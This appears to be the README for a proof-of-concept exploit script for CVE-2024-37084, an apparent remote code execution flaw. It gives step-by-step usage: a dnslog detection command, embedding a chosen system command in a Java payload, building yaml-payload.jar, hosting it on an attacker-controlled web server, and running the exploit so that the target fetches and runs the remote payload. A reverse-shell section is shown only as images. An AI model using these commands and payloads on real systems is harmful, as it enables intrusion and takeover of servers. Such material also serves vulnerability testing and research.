## <font style="color:rgb(31, 35, 40);">Detect vulnerabilities</font>
<font style="color:rgb(31, 35, 40);">First, Use dnslog to detect whether CVE-2024-37084 vulnerability exists, Then manually check dnslog。Dnslog platform such as：</font>[<font style="color:rgb(31, 35, 40);">http://www.dnslog.cn/</font>](http://www.dnslog.cn/)

```bash
python cve-2024-37084-exp.py -u http://192.168.67.135:7577 -dnslog xxx.dnslog.cn
```

<font style="color:rgb(31, 35, 40);">manually check dnslog</font>

![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045006195-295b0386-b53b-4d16-b4ec-e1663e15dac1.png)

## RCE
you can Execute system commands

**<font style="color:rgb(31, 35, 40);">first:</font>**<font style="color:rgb(31, 35, 40);"> Enter the command you want to execute in 'src\artsploit\AwesomeScriptEngineFactory.java'</font>

![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045045205-8bd31149-a8f2-450c-b0e0-ae0b53501e35.png)

**<font style="color:rgb(31, 35, 40);">after that:</font>**<font style="color:rgb(31, 35, 40);"> Double-click the. py file to generate the yaml-payload.jar file.</font>

![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045069120-ebd129d5-35ec-446f-8895-0f7c91ae72ee.png)

**<font style="color:rgb(31, 35, 40);">after that:</font>**<font style="color:rgb(31, 35, 40);"> </font><font style="color:rgb(31, 35, 40);">Put yaml-payload.jar on the linux server and start a web service with python. Note: Every time you execute a different command, you need to rename yaml-payload.jar, that is, xx.jar that you access, with a different name every time. Otherwise the new command will not take effect.</font>

<font style="color:rgb(31, 35, 40);">The access path is as follows:</font><font style="color:rgb(31, 35, 40);"> </font>[<font style="color:rgb(31, 35, 40);">http://192.168.67.133/yaml-payload.jar</font>](http://192.168.67.133/yaml-payload.jar)<font style="color:rgb(31, 35, 40);">.</font>

**<font style="color:rgb(31, 35, 40);">finally:</font>**<font style="color:rgb(31, 35, 40);"> Execute poc</font>

```bash
cve-2024-37084-exp.py -u http://192.168.67.135:7577 -payload http://192.168.67.133/yaml-payload.jar
```

![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045153651-5a1c5111-087d-4475-966d-43f8960a822d.png)

<font style="color:rgb(31, 35, 40);">Enter the corresponding container to view and successfully execute the command.</font>

![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045170031-9f87c805-c8b8-4f1c-a774-2b7b967b87ed.png)

## <font style="color:rgb(31, 35, 40);">Rebound shell</font>
![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045266424-a516abde-f5c5-4b64-827d-f6503a5e37f0.png)  
 ![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045311998-56575539-911d-45f4-8973-e099dff780a4.png)

![](https://cdn.nlark.com/yuque/0/2024/png/22971806/1729045328661-eb483698-f165-4eb8-8f33-038be72223b0.png)

  
 

